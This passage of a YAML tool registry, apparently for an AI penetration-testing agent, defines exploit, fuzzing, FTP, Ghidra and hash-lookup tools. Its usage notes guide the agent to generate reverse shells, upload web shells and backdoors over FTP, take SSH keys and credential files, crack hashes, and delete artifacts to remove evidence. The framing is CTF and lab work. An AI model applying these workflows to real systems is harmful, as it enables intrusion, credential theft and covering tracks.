            type: string
            description: Password for authenticated enumeration.
          timeout:
            type: integer
            default: 300
            description: Timeout in seconds.
        returns:
          password_policy:
            type: object
            description: 'Password policy: min_length, complexity_required, lockout_threshold, lockout_duration_minutes, max_password_age_days,
              password_history_length.'
          domain_info:
            type: object
            description: 'Domain/OS info: OS version string, domain name, server type, DNS hostname.'
  exploit-runner:
    name: exploit-runner
    version: '1.1'
    description: 'General-purpose exploit execution environment for running CVE exploits, PoCs, custom scripts, and parameterized
      exploit templates. Supports Python3, Python2, Ruby, and Bash scripts with automatic temp file management and output
      capture. Includes comprehensive binary exploitation toolkit: pwntools (Python exploit framework), GDB+pwndbg (debugger
      with exploit helpers), ropper (ROP gadget finder), one_gadget (libc one-shot RCE finder), patchelf (ELF binary patching),
      and impacket (Windows protocol exploitation). Also includes requests, paramiko, beautifulsoup4, pycryptodome, and build-essential
      for compiling C exploits. Provides YAML-based exploit templates with parameter substitution and success/failure indicator
      matching (3 built-in: Log4Shell, Cacti RCE, Jenkins file read). Payload generation for reverse/bind shells in bash/python/php.'
    image: ghcr.io/silicon-works/mcp-tools-exploit-runner:latest
    image_size_mb: 800
    capabilities:
    - python_exploits
    - shell_exploits
    - ruby_exploits
    - exploit_analysis
    - exploit_templates
    - payload_generation
    routing:
      use_for:
      - run known CVE exploits
      - execute exploit templates
      - generate reverse shell payloads
      - run PoC scripts
      - binary exploitation with pwntools
      - buffer overflow exploit development
      - ROP chain building
      - format string exploitation
      - ELF binary analysis checksec
      - pwntools scripting
      - GDB debugging binary
      - find buffer overflow offset
      never_use_for:
      - port scanning
      - enumeration
      triggers:
      - run exploit
      - execute PoC
      - CVE exploit
      - exploit template
      - run script
      prefer_over: []
    phases:
    - exploitation
    - post-exploitation
    requirements:
      network: true
      privileged: true
    resources:
      memory_mb: 512
      cpu: 1.0
    methods:
      run_python:
        description: Execute a Python exploit script with full output capture. Writes script content to temp file in /tmp/exploits/,
          runs with specified Python version, captures stdout/stderr (capped at 50KB/10KB), and cleans up temp files. The
          container has pwntools, requests, paramiko, impacket, pycryptodome, beautifulsoup4, lxml, ropper pre-installed —
          no pip install needed for these. Scripts can also be passed as base64 (for binary content or special characters)
          or by file path (for prepared exploits).
        when_to_use: 'The primary method for running exploits. Use for: (1) Running CVE exploit scripts from searchsploit
          (after get_exploit retrieves the code), (2) Running GitHub PoC scripts, (3) Writing and executing custom pwntools
          scripts for buffer overflows, format strings, ROP chains, (4) Running impacket-based Windows exploitation scripts
          (secretsdump, psexec, etc.), (5) Any Python exploit that needs network access to the target. The workflow: searchsploit
          search → searchsploit get_exploit → analyze_exploit (safety check) → prepare_exploit (if dependencies needed) →
          run_python.'
        params:
          script:
            type: string
            required: true
            description: Python script content or file path (if is_path=true)
          args:
            type: array
            description: Command line arguments for the script
          is_path:
            type: boolean
            default: false
            description: Whether script is a file path (vs inline content)
          is_base64:
            type: boolean
            default: false
            description: Whether script content is base64 encoded
          python_version:
            type: enum
            values:
            - python3
            - python2
            default: python3
            description: Python version to use
          timeout:
            type: integer
            default: 120
            description: Execution timeout in seconds
          env:
            type: object
            description: Environment variables to set
        returns:
          returncode:
            type: integer
            description: Exit code
          stdout:
            type: string
            description: Standard output
          stderr:
            type: string
            description: Standard error
      run_shell:
        description: Execute a shell script or command in bash/sh/zsh. Writes script to temp file, makes it executable, runs
          with specified shell, and captures output. The container includes curl, wget, netcat (nc), nmap, git, gcc (build-essential),
          gdb, ltrace, strace, patchelf, and binutils — useful for compiling C exploits, network operations, and binary analysis.
        when_to_use: 'For shell-based exploits, one-liners, or when you need to compile and run C exploits. Common uses: (1)
          Compile a C exploit from searchsploit: ''gcc exploit.c -o exploit && ./exploit'', (2) Run bash-based reverse shell
          exploits, (3) Execute multi-step exploitation chains (download→compile→execute), (4) Run network utilities (nc,
          curl, wget) for exploit delivery. Use run_python instead for complex exploits that benefit from Python libraries.'
        params:
          script:
            type: string
            required: true
            description: Shell script content
          args:
            type: array
            description: Command line arguments
          shell:
            type: enum
            values:
            - bash
            - sh
            - zsh
            default: bash
            description: Shell to use
          timeout:
            type: integer
            default: 120
            description: Execution timeout
          env:
            type: object
            description: Environment variables
        returns:
          returncode:
            type: integer
            description: Exit code
          stdout:
            type: string
            description: Standard output
          stderr:
            type: string
            description: Standard error
      run_ruby:
        description: Execute a Ruby exploit script
        when_to_use: To run Ruby-based exploits (many Metasploit modules)
        params:
          script:
            type: string
            required: true
            description: Ruby script content or path
          args:
            type: array
            description: Command line arguments
          is_path:
            type: boolean
            default: false
            description: Whether script is a file path
          timeout:
            type: integer
            default: 120
            description: Execution timeout
          env:
            type: object
            description: Environment variables to set
        returns:
          returncode:
            type: integer
            description: Exit code
          stdout:
            type: string
            description: Standard output
          stderr:
            type: string
            description: Standard error
      prepare_exploit:
        description: Save an exploit script to /tmp/exploits/ and optionally install Python dependencies via pip. Makes the
          file executable (chmod 755). Validates filename against path traversal. Content can be plain text or base64-encoded.
          Use this before run_python with is_path=true for exploits that need modification between runs or require additional
          pip packages.
        when_to_use: 'When an exploit needs dependencies not pre-installed in the container, or when you want to save a script
          for repeated execution with different arguments. The workflow: (1) Get exploit code from searchsploit or GitHub,
          (2) analyze_exploit to check requirements, (3) prepare_exploit with requirements=[''missing-package''], (4) run_python
          with is_path=true pointing to the saved path. Also useful for saving modified exploit code that you''ve customized
          for the target.'
        params:
          content:
            type: string
            required: true
            description: Exploit script content
          filename:
            type: string
            required: true
            description: Filename to save as
          is_base64:
            type: boolean
            default: false
            description: Whether content is base64 encoded
          requirements:
            type: array
            description: Python packages to install
        returns:
          path:
            type: string
            description: Saved exploit path
          requirements_installed:
            type: array
            description: Installed packages
      list_exploits:
        description: List prepared exploits in workspace
        when_to_use: To see available prepared exploits
        params: {}
        returns:
          exploits:
            type: array
            description: List of prepared exploits
      analyze_exploit:
        description: Static analysis of an exploit script — detects language (Python/Ruby/Shell), counts lines, extracts imports,
          identifies dangerous patterns (eval, exec, subprocess, os.system, rm -rf), network operations (socket, requests,
          curl, nc), file operations, and estimates pip requirements from imports. Does NOT execute the script.
        when_to_use: 'Always run this before executing an unknown exploit from searchsploit or GitHub. Public exploits may
          contain backdoors, destructive operations, or require specific dependencies. The analysis output tells you: (1)
          What language it''s in (determines run method), (2) What pip packages are needed (pass to prepare_exploit), (3)
          Whether it has dangerous patterns to review, (4) Whether it makes network connections (needs target info as args).'
        params:
          script:
            type: string
            required: true
            description: Exploit script content
          language:
            type: enum
            values:
            - python
            - ruby
            - shell
            - auto
            default: auto
            description: Script language
        returns:
          language:
            type: string
            description: Detected language
          imports:
            type: array
            description: Imported modules
          dangerous_patterns:
            type: array
            description: Potentially dangerous operations
          likely_requirements:
            type: array
            description: Likely pip requirements
      list_templates:
        description: List available parameterized exploit templates
        when_to_use: To see what CVE exploits are available as templates
        params:
          cve:
            type: string
            description: Filter by CVE ID
          software:
            type: string
            description: Filter by affected software
          severity:
            type: string
            enum:
            - critical
            - high
            - medium
            - low
            description: Filter by severity
          tag:
            type: string
            description: Filter by tag
        returns:
          templates:
            type: array
            description: List of exploit templates
          total:
            type: integer
            description: Number of templates found
      get_template:
        description: Get details of a specific exploit template
        when_to_use: To see what parameters an exploit template needs
        params:
          template_id:
            type: string
            required: true
            description: Template ID
        returns:
          id:
            type: string
            description: Template ID
          name:
            type: string
            description: Template name
          cve:
            type: string
            description: CVE identifier
          parameters:
            type: array
            description: Required parameters
          description:
            type: string
            description: Full description
      search_templates:
        description: Search for exploit templates by software/version
        when_to_use: To find exploits for a specific software you discovered
        params:
          software:
            type: string
            required: true
            description: Software name (e.g., 'jenkins', 'log4j')
          version:
            type: string
            description: Version string
        returns:
          matches:
            type: array
            description: Matching templates
          total:
            type: integer
            description: Number of matches
      run_template:
        description: Execute an exploit template with parameters
        when_to_use: To run a CVE exploit by filling in target-specific parameters
        params:
          template_id:
            type: string
            required: true
            description: Template ID (e.g., 'log4shell', 'cacti-cmd-injection')
          params:
            type: object
            required: true
            description: Exploit parameters (target_url, command, etc.)
          timeout:
            type: integer
            default: 120
            description: Execution timeout
        returns:
          output:
            type: string
            description: Exploit output
          success:
            type: boolean
            description: Whether exploit succeeded
          indicators_matched:
            type: array
            description: Success indicators found in output
      generate_payload:
        description: Generate reverse shell, bind shell, or command execution payloads in bash, Python, or PHP. Returns both
          raw payload and base64-encoded version. Bash reverse shell uses '/dev/tcp', Python uses socket+subprocess, PHP uses
          fsockopen. Bind shells use netcat. All payloads target /bin/sh.
        when_to_use: 'When you need a payload for an RCE vulnerability. Common workflow: (1) Confirm RCE via curl inject with
          a simple ''id'' command, (2) generate_payload for a reverse shell, (3) Start a listener with netcat tool, (4) Deliver
          the payload via the RCE. Choose language based on what''s available on the target: bash (most Linux systems), python
          (if Python installed), php (if PHP web server). The base64 output is useful for encoding payloads to avoid special
          character issues.'
        params:
          payload_type:
            type: string
            required: true
            enum:
            - reverse_shell
            - bind_shell
            - command
            description: Type of payload
          lhost:
            type: string
            description: Attacker IP for reverse shells
          lport:
            type: integer
            description: Attacker port
          command:
            type: string
            description: Command for command payloads
          language:
            type: string
            default: bash
            enum:
            - bash
            - python
            - php
            description: Payload language
        returns:
          payload:
            type: string
            description: Generated payload
          payload_base64:
            type: string
            description: Base64 encoded payload
  ffuf:
    name: ffuf
    version: 2.1.0
    description: 'Fast web fuzzer (ffuf v2.1.0, Go-based) for directory/file discovery, GET/POST parameter fuzzing, and virtual
      host enumeration. Uses FUZZ keyword placeholder in URLs, headers, or POST data. Includes 7 built-in wordlists: common
      (4,614 entries), big (20,469), small (959), dirbuster-small (87,650), dirbuster-medium (220,546), raft-small, raft-medium
      from SecLists. Supports response filtering by status code, size, lines, words, regex, and response time. Default 40
      concurrent threads. JSON output with structured result parsing. Auto-calibration (-ac) for intelligent response filtering.
      Includes dirb and SecLists wordlists.'
    image: ghcr.io/silicon-works/mcp-tools-ffuf:latest
    image_size_mb: 200
    capabilities:
    - directory_bruteforce
    - parameter_fuzzing
    - vhost_discovery
    routing:
      use_for:
      - directory brute-forcing
      - directory enumeration
      - find hidden files
      - find hidden directories
      - parameter fuzzing
      - vhost discovery
      - subdomain enumeration
      never_use_for:
      - SQL injection
      - port scanning
      - password cracking
      triggers:
      - ffuf
      - directory brute
      - fuzz
      - dirbuster
      - hidden files
      - hidden directories
      - vhost
      - wordlist
      prefer_over:
      - gobuster
      - dirbuster
    phases:
    - enumeration
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 512
      cpu: 1.0
    methods:
      dir_fuzz:
        description: Fuzz directories and files on a web server using wordlist-based brute-forcing. Appends FUZZ keyword to
          URL if not present. Runs ffuf with JSON output, auto-calibration, and configurable thread count (default 40). Supports
          file extension fuzzing (e.g., .php,.html,.txt), custom headers, cookies for authenticated fuzzing, and response
          size filtering. Returns discovered paths with HTTP status code, content length, word count, and line count.
        when_to_use: 'The standard web enumeration step after discovering an HTTP/HTTPS service. Run this to find hidden directories,
          admin panels, backup files, and API endpoints. Start with wordlist=''common'' (fast, 4.6K entries), then try ''big''
          (20K) or ''dirbuster-medium'' (220K) if initial results are sparse. Add extensions=''php,html,txt,bak,old'' for
          the target''s technology stack. For PHP sites: extensions=''php,php.bak,inc''. For Java: extensions=''jsp,do,action''.
          Filter out false positives with filter_size (e.g., ''0'' for empty responses). Use cookies param for post-authentication
          fuzzing.'
        params:
          url:
            type: string
            required: true
            description: Target URL (FUZZ keyword added automatically if missing)
          wordlist:
            type: string
            default: common
            description: Wordlist name (common, big, dirbuster-small, dirbuster-medium) or path
          extensions:
            type: string
            description: File extensions to append (e.g., 'php,html,txt')
          threads:
            type: integer
            default: 40
            description: Number of concurrent threads
          filter_status:
            type: string
            description: 'Match these status codes (default: 200,204,301,302,307,401,403,405)'
          filter_size:
            type: string
            description: Filter out responses of this size
          timeout:
            type: integer
            default: 10
            description: HTTP request timeout in seconds
          headers:
            type: object
            description: 'Custom HTTP headers as key-value pairs (e.g., {"Host": "target.htb"})'
          cookies:
            type: string
            description: Cookie header value for authenticated fuzzing
        returns:
          results:
            type: array
            description: Discovered paths with status codes and sizes
          summary:
            type: object
            description: Summary with target, wordlist, and found paths
      param_fuzz:
        description: Fuzz GET or POST parameters on a web endpoint. The FUZZ keyword must be placed in the URL query string
          (GET) or POST data body. Supports JSON POST bodies. Uses same wordlist resolution and filtering as dir_fuzz. Useful
          for discovering hidden GET parameters, valid parameter values, or testing for different responses that indicate
          injection points.
        when_to_use: 'Two main scenarios: (1) Discover hidden GET parameters — place FUZZ as the parameter name: url=''http://target.com/page?FUZZ=test''.
          (2) Fuzz parameter values for valid inputs — place FUZZ as the value: url=''http://target.com/api?id=FUZZ''. For
          POST parameter fuzzing, set method=''POST'' and data=''username=admin&password=FUZZ''. Filter by response size to
          find responses that differ from the default (which indicates a valid parameter or value). Also useful for IDOR testing
          by fuzzing numeric IDs.'
        params:
          url:
            type: string
            required: true
            description: Target URL with FUZZ keyword in parameter
          wordlist:
            type: string
            default: common
            description: Wordlist name or path
          method:
            type: enum
            default: GET
            values:
            - GET
            - POST
            description: HTTP method
          data:
            type: string
            description: POST data with FUZZ keyword (e.g., 'username=admin&password=FUZZ')
          threads:
            type: integer
            default: 40
            description: Number of concurrent threads
          filter_status:
            type: string
            description: Match these status codes
          filter_size:
            type: string
            description: Filter out responses of this size
          headers:
            type: object
            description: Custom HTTP headers as key-value pairs
          cookies:
            type: string
            description: Cookie header value for authenticated fuzzing
        returns:
          results:
            type: array
            description: Matching parameter values with responses
      vhost_fuzz:
        description: Fuzz virtual hosts by sending requests with different Host headers. Sets Host header to 'FUZZ.domain'
          and filters by response size to identify valid vhosts that return different content than the default. Critical for
          HTB/CTF targets where the IP hosts multiple sites under different subdomains.
        when_to_use: 'When you have a target IP that serves different content based on the Host header — common in CTFs (Hack
          The Box) and shared hosting. The workflow: (1) Access the IP directly, note the default response size, (2) vhost_fuzz
          with filter_size set to the default size to filter it out. This reveals subdomains like ''dev.target.htb'', ''api.target.htb'',
          ''internal.target.htb'' that serve different applications. Add discovered vhosts to /etc/hosts. Use after nmap finds
          HTTP and you''ve already done dir_fuzz on the main site.'
        params:
          url:
            type: string
            required: true
            description: Target URL (IP address or hostname)
          domain:
            type: string
            required: true
            description: Base domain for vhost fuzzing (e.g., 'target.htb')
          wordlist:
            type: string
            default: common
            description: Wordlist for subdomain prefixes
          threads:
            type: integer
            default: 40
            description: Number of concurrent threads
          filter_size:
            type: string
            description: Filter out default response size
        returns:
          vhosts:
            type: array
            description: Discovered virtual hosts
          summary:
            type: object
            description: Summary with target domain and found vhosts
  ftp:
    name: ftp
    version: '1.0'
    description: 'FTP/FTPS client (Python ftplib) for connecting to FTP servers, listing directories, downloading files, uploading
      content, and deleting files. 5 methods: connect (test connection + root listing), list (directory contents with parsed
      permissions/sizes), download (file as base64 + text), upload (text or base64 content), delete. Defaults to anonymous
      login (username=''anonymous'', password=''anonymous@''). Supports FTPS (FTP over SSL/TLS) with auto-disabled certificate
      verification. Downloads return both base64 (for binary) and text (for readable files, capped at 50KB). Uploads support
      plain text or base64-encoded binary content.'
    image: ghcr.io/silicon-works/mcp-tools-ftp:latest
    image_size_mb: 100
    capabilities:
    - ftp_connection
    - file_transfer
    - directory_listing
    phases:
    - enumeration
    - exploitation
    - post-exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 128
      cpu: 0.25
    routing:
      use_for:
      - connect to FTP server and list directory contents
      - download files from FTP server
      - upload web shells or exploits to writable FTP share
      - check anonymous FTP access on port 21
      - enumerate files on FTP server after nmap finds port 21
      - transfer files via FTPS encrypted connection
      never_use_for:
      - FTP brute-force (use hydra)
      - port scanning
      - HTTP file download (use curl)
      triggers:
      - FTP
      - FTPS
      - anonymous FTP
      - FTP upload
      - FTP download
      - port 21
      prefer_over:
      - curl
    methods:
      connect:
        description: Test FTP connection, authenticate, and list the root directory contents. Returns the server welcome banner
          (often reveals software version like 'vsFTPd 3.0.3'), current working directory, and up to 50 file listing entries.
          Defaults to anonymous login.
        when_to_use: The first step after nmap discovers FTP on port 21. Try anonymous access first (default credentials)
          — many FTP servers allow anonymous read access. The welcome banner often reveals the FTP software and version (vsFTPd,
          ProFTPD, Pure-FTPd, FileZilla Server) — check searchsploit for exploits. If anonymous login fails with 'permission
          denied', try with discovered credentials. After successful connect, use list to explore subdirectories and download
          to retrieve interesting files.
        params:
          host:
            type: string
            required: true
            description: FTP server hostname or IP address.
          port:
            type: integer
            default: 21
            description: FTP port. Standard is 21.
          username:
            type: string
            default: anonymous
            description: FTP username. Default 'anonymous' for anonymous access. Use discovered credentials for authenticated
              access.
          password:
            type: string
            default: anonymous@
            description: FTP password. Default 'anonymous@' for anonymous access.
          ssl:
            type: boolean
            default: false
            description: Use FTPS (FTP over TLS). Certificate verification is disabled for pentest use.
          timeout:
            type: integer
            default: 30
            description: Connection timeout in seconds.
        returns:
          welcome:
            type: string
            description: Server welcome banner (often contains software name and version).
          listing:
            type: array
            description: Root directory listing (raw LIST output, up to 50 entries).
      list:
        description: List contents of a specific directory on the FTP server. Returns both parsed file data (permissions,
          size, name, is_dir flag) and raw LIST output. Also returns simple filenames via NLST. Changes to the specified directory
          before listing.
        when_to_use: 'To explore subdirectories after initial connect. Look for: (1) Configuration files — .conf, .ini, .xml,
          .env, (2) Backup files — .bak, .old, .zip, .tar.gz, (3) Web application files — .php, .html, .asp, (4) Credential
          files — .htpasswd, id_rsa, (5) Directories with write permissions (starts with ''drwxrwxrwx''). After finding interesting
          files, use download to retrieve them.'
        params:
          host:
            type: string
            required: true
            description: FTP server hostname or IP address.
          path:
            type: string
            default: /
            description: Directory path to list (e.g., '/pub', '/upload', '/home/user').
          port:
            type: integer
            default: 21
            description: FTP port.
          username:
            type: string
            default: anonymous
            description: FTP username.
          password:
            type: string
            default: anonymous@
            description: FTP password.
          ssl:
            type: boolean
            default: false
            description: Use FTPS.
          timeout:
            type: integer
            default: 30
            description: Connection timeout in seconds.
        returns:
          files:
            type: array
            description: 'Parsed files, each with: permissions (e.g., ''drwxr-xr-x''), size, name, is_dir (boolean).'
          raw_listing:
            type: array
            description: Raw FTP LIST output lines.
      download:
        description: Download a file from the FTP server via RETR binary transfer. Returns file content as both base64 (always)
          and plain text (if UTF-8 decodable, capped at 50KB). The entire file is loaded into memory — suitable for config
          files, scripts, and small binaries, not for multi-GB files.
        when_to_use: 'To retrieve files discovered via connect or list. Common targets: (1) Configuration files with credentials
          — wp-config.php, .env, web.config, (2) SSH private keys — id_rsa, (3) Database files — .sqlite, .db, (4) Backup
          archives — .zip, .tar.gz (check size first), (5) CTF flags — user.txt, root.txt. The content_text field is useful
          for text files; use content_base64 for binary files that need further processing.'
        params:
          host:
            type: string
            required: true
            description: FTP server hostname or IP address.
          remote_path:
            type: string
            required: true
            description: Full path to the file on the FTP server (e.g., '/pub/backup.zip', '/home/user/.ssh/id_rsa').
          port:
            type: integer
            default: 21
            description: FTP port.
          username:
            type: string
            default: anonymous
            description: FTP username.
          password:
            type: string
            default: anonymous@
            description: FTP password.
          ssl:
            type: boolean
            default: false
            description: Use FTPS.
          timeout:
            type: integer
            default: 60
            description: Transfer timeout in seconds.
        returns:
          filename:
            type: string
            description: Extracted filename from the path.
          size_bytes:
            type: integer
            description: Downloaded file size in bytes.
          content_base64:
            type: string
            description: File content as base64 string (always present).
          content_text:
            type: string
            description: File content as text (only if UTF-8 decodable, capped at 50KB). null for binary files.
      upload:
        description: Upload a file to the FTP server via STOR binary transfer. Content can be plain text (default) or base64-encoded
          binary. Writes to a local temp file, uploads via STORBINARY, then cleans up. Requires write permission on the FTP
          server — anonymous upload is rarely allowed.
        when_to_use: 'When the FTP server has a writable directory (often overlapping with a web server''s document root).
          Common uses: (1) Upload a PHP web shell to a writable /var/www/html via FTP, then trigger via HTTP, (2) Upload exploit
          scripts or tools to the target, (3) Plant backdoor files in shared directories. Check list output for writable directories
          first (look for ''drwxrwxrwx'' permissions or try uploading a test file). Requires authenticated credentials — anonymous
          upload is rare.'
        params:
          host:
            type: string
            required: true
            description: FTP server hostname or IP address.
          remote_path:
            type: string
            required: true
            description: Destination path on the FTP server (e.g., '/upload/shell.php', '/var/www/html/cmd.php').
          content:
            type: string
            required: true
            description: File content as plain text (default) or base64-encoded binary (set is_base64=true).
          is_base64:
            type: boolean
            default: false
            description: Set true if content is base64-encoded (for binary file uploads).
          port:
            type: integer
            default: 21
            description: FTP port.
          username:
            type: string
            required: true
            description: FTP username (required — anonymous upload is rarely allowed).
          password:
            type: string
            required: true
            description: FTP password.
          ssl:
            type: boolean
            default: false
            description: Use FTPS.
          timeout:
            type: integer
            default: 60
            description: Transfer timeout in seconds.
        returns:
          uploaded:
            type: boolean
            description: Whether upload succeeded.
          size_bytes:
            type: integer
            description: Uploaded file size in bytes.
      delete:
        description: Delete a file from the FTP server via DELE command. Requires write/delete permissions on the server.
        when_to_use: To clean up uploaded web shells, exploit files, or other artifacts after exploitation is complete. Good
          operational security practice to remove evidence.
        params:
          host:
            type: string
            required: true
            description: FTP server hostname or IP address.
          remote_path:
            type: string
            required: true
            description: Path to the file to delete on the FTP server.
          port:
            type: integer
            default: 21
            description: FTP port.
          username:
            type: string
            required: true
            description: FTP username (must have delete permissions).
          password:
            type: string
            required: true
            description: FTP password.
          ssl:
            type: boolean
            default: false
            description: Use FTPS.
          timeout:
            type: integer
            default: 30
            description: Connection timeout in seconds.
        returns:
          deleted:
            type: boolean
            description: Whether deletion succeeded.
  ghidra:
    name: ghidra
    version: '12.0'
    description: Ghidra reverse engineering framework for binary decompilation, disassembly, function analysis, and cross-reference
      mapping. Converts machine code to readable C pseudocode. Powered by bethington/ghidra-mcp (headless mode, 128 tools
      available via bridge).
    image: ghcr.io/silicon-works/mcp-tools-ghidra:latest
    image_size_mb: 1500
    capabilities:
    - decompilation
    - disassembly
    - binary_analysis
    - reverse_engineering
    - cross_references
    routing:
      use_for:
      - decompile binary to C code
      - reverse engineer executable
      - understand what a binary does
      - analyze ELF binary functions
      - find vulnerability in binary
      - list functions in executable
      - cross-reference analysis
      - binary reverse engineering
      - decompile SUID binary
      - static binary analysis
      never_use_for:
      - port scanning
      - web scanning
      - running exploits
      triggers:
      - decompile
      - reverse engineer
      - ghidra
      - disassemble
      - binary analysis
      prefer_over: []
    phases:
    - enumeration
    - exploitation
    requirements:
      network: false
      privileged: false
    resources:
      memory_mb: 4096
      cpu: 2.0
    methods:
      load_binary:
        description: Load a binary file from the filesystem into Ghidra and run auto-analysis. Call this first before using
          other analysis methods — analysis can take 5-30s depending on binary size.
        when_to_use: First step when you have a binary to analyze. Load it once, then use decompile_function, list_functions,
          etc. repeatedly without waiting again.
        params:
          file:
            type: string
            required: true
            description: Absolute path to the binary file (e.g., '/data/vuln', '/session/binary')
        returns:
          program:
            type: string
            description: Program name in Ghidra project
      decompile_function:
        description: Decompile a function to C pseudocode by name or address. Returns readable C code from machine code, making
          it easy to identify vulnerabilities like buffer overflows, format strings, and logic flaws.
        when_to_use: After identifying a potentially vulnerable function (from strings, symbols, or function list) to understand
          its logic in C rather than reading raw assembly.
        params:
          name:
            type: string
            description: Function name to decompile (e.g., 'main', 'vuln'). Either name or address required.
          address:
            type: string
            description: Function address in hex (e.g., '0x401234'). Alternative to name.
          program:
            type: string
            description: Program name for multi-binary sessions
        returns:
          decompiled:
            type: string
            description: C pseudocode of the function
      list_functions:
        description: 'List all functions found in the binary with their addresses. Note: returns all functions regardless
          of offset/limit in headless mode.'
        when_to_use: First step when analyzing an unknown binary — get an overview of all functions to identify interesting
          targets (main, custom functions, vulnerable-looking names like 'check_auth', 'handle_input').
        params:
          program:
            type: string
            description: Program name for multi-binary sessions
        returns:
          functions:
            type: array
            description: List of functions with name and address
      search_functions_by_name:
        description: Search for functions whose names contain a query string. Case-insensitive substring match.
        when_to_use: When looking for functions related to specific behavior (e.g., search 'auth' to find authentication functions,
          'buf' to find buffer-related functions).
        params:
          query:
            type: string
            required: true
            description: Substring to search for in function names (e.g., 'auth', 'check', 'buf')
          program:
            type: string
            description: Program name for multi-binary sessions
        returns:
          functions:
            type: array
            description: Matching functions with name and address
      get_xrefs_to:
        description: Get cross-references TO an address — shows what code calls or references this location.
        when_to_use: To understand how a potentially vulnerable function is reached (call chain), or to find all callers of
          a dangerous function like system(), execve(), strcpy().
        params:
          address:
            type: string
            required: true
            description: Target address in hex (e.g., '0x401234')
          offset:
            type: integer
            default: 0
            description: Pagination offset
          limit:
            type: integer
            default: 100
            description: Maximum results to return
          program:
            type: string
            description: Program name for multi-binary sessions
        returns:
          xrefs:
            type: array
            description: List of addresses/functions that reference this location
      get_function_xrefs:
        description: Get all cross-references to a function by name — easier than get_xrefs_to when you have a name, not an
          address.
        when_to_use: When you know a function name and want to find all callers without looking up its address first.
        params:
          name:
            type: string
            required: true
            description: Function name to find references for
          offset:
            type: integer
            default: 0
            description: Pagination offset
          limit:
            type: integer
            default: 100
            description: Maximum results to return
          program:
            type: string
            description: Program name for multi-binary sessions
        returns:
          xrefs:
            type: array
            description: List of references to the function
      list_strings:
        description: List all defined strings in the binary with their addresses. Finds URLs, passwords, error messages, format
          strings, /bin/sh, and other interesting constants.
        when_to_use: To find interesting strings (URLs, passwords, error messages, format strings, /bin/sh) and trace them
          back to the functions that use them via xrefs.
        params:
          offset:
            type: integer
            default: 0
            description: Pagination offset
          limit:
            type: integer
            default: 100
            description: Maximum strings to return
          program:
            type: string
            description: Program name for multi-binary sessions
        returns:
          strings:
            type: array
            description: Strings with addresses
      list_imports:
        description: List imported functions (from libc, etc.) with their addresses. Shows what external functions the binary
          uses.
        when_to_use: To identify dangerous imports (gets, strcpy, printf, system) that indicate vulnerability types, and to
          get addresses needed for ROP chains and GOT overwrite attacks.
        params:
          offset:
            type: integer
            default: 0
            description: Pagination offset
          limit:
            type: integer
            default: 100
            description: Maximum results
          program:
            type: string
            description: Program name for multi-binary sessions
        returns:
          imports:
            type: array
            description: Imported functions with names and addresses
      list_exports:
        description: List exported symbols from the binary.
        when_to_use: To see what symbols the binary exports — useful for shared libraries or to find entry points.
        params:
          offset:
            type: integer
            default: 0
            description: Pagination offset
          limit:
            type: integer
            default: 100
            description: Maximum results
          program:
            type: string
            description: Program name for multi-binary sessions
        returns:
          exports:
            type: array
            description: Exported symbols with names and addresses
      list_segments:
        description: List memory segments (sections) of the binary with address ranges.
        when_to_use: To understand memory layout — which segments are executable (for shellcode), writable (for overwrites),
          or both (W+X = exploitable).
        params:
          program:
            type: string
            description: Program name for multi-binary sessions
        returns:
          segments:
            type: array
            description: Segments with name, address range
      get_entry_points:
        description: Get all entry point addresses for the binary.
        when_to_use: To find the binary's entry point(s) — useful for stripped binaries where main() isn't easily identifiable.
        params: {}
        returns:
          entry_points:
            type: array
            description: Entry point names and addresses
      rename_function:
        description: Rename a function to give it a more descriptive name.
        when_to_use: After identifying what a function does, rename it for clarity (e.g., rename 'FUN_00401234' to 'vulnerable_strcpy_wrapper').
        params:
          old_name:
            type: string
            required: true
            description: Current function name
          new_name:
            type: string
            required: true
            description: New function name
        returns:
          result:
            type: string
            description: Confirmation of rename
      get_metadata:
        description: Get metadata about the currently loaded program — name, path, architecture, compiler, image base address.
        when_to_use: After loading a binary, to determine its architecture (x86, ARM, MIPS), compiler, and base address for
          calculating offsets.
        params: {}
        returns:
          metadata:
            type: object
            description: Program name, path, language, compiler, image_base, address_size
      get_function_by_address:
        description: Get function information by its address. Returns name, signature, and calling convention.
        when_to_use: When you have a hex address (from xrefs, crash logs, or exploit output) and need to find which function
          it belongs to.
        params:
          address:
            type: string
            required: true
            description: Address in hex (e.g., '0x401234')
        returns:
          function:
            type: object
            description: Function name, address, signature, calling convention
      get_function_variables:
        description: List all variables in a function including parameters and locals.
        when_to_use: To understand a function's stack layout — identify buffer sizes, variable types, and stack offsets needed
          for buffer overflow exploits.
        params:
          function_name:
            type: string
            required: true
            description: Function name to inspect
        returns:
          variables:
            type: object
            description: Function parameters and local variables with types
      check_connection:
        description: Verify the Ghidra server is running and responsive.
        when_to_use: To check if Ghidra is ready before starting analysis, or to diagnose connection issues.
        params: {}
        returns:
          status:
            type: string
            description: Connection status and server version
      list_open_programs:
        description: List all currently open programs in Ghidra.
        when_to_use: When working with multiple binaries to see which programs are loaded and which is currently active.
        params: {}
        returns:
          programs:
            type: array
            description: List of open program names with current indicator
  hash-lookup:
    name: hash-lookup
    version: '1.0'
    description: Online hash lookup tool that queries public pre-cracked hash databases (hashes.com, nitrxgen, hashtoolkit)
      to instantly recover plaintext passwords from known hashes. Much faster than john/hashcat for common passwords — lookup
      takes seconds vs minutes/hours for offline cracking. Also provides hash type identification (MD5, SHA1, SHA256, SHA512,
      NTLM, MySQL, bcrypt) via pattern matching, and hash generation (MD5, SHA1, SHA256, SHA512, NTLM) for testing and verification.
      Pure Python — no external tools, requires network access.
    image: ghcr.io/silicon-works/mcp-tools-hash-lookup:latest
    image_size_mb: 100
    capabilities:
    - hash_lookup
    - hash_identification
    - online_cracking
    phases:
    - post-exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 128
      cpu: 0.25
    routing:
      use_for:
      - instantly crack known password hashes via online database lookup
      - identify unknown hash type format from hash string
      - check if a hash has been previously cracked in public databases
      - quick hash lookup before running slow offline cracking with john
      - generate MD5 SHA1 SHA256 SHA512 NTLM hashes for testing
      - batch lookup of multiple password hashes at once
      - verify cracked passwords by comparing generated hashes
      never_use_for:
      - offline brute-force cracking (use john)
      - password spraying or online brute-force (use hydra)
      - cracking salted hashes (online databases don't have salted hashes)
      - bcrypt scrypt argon2 hashes (too slow to precompute)
      triggers:
      - hash
      - crack
      - password hash
      - NTLM
      - MD5
      - SHA
      - hash lookup
      - identify hash
      - what hash
      prefer_over:
      - hydra
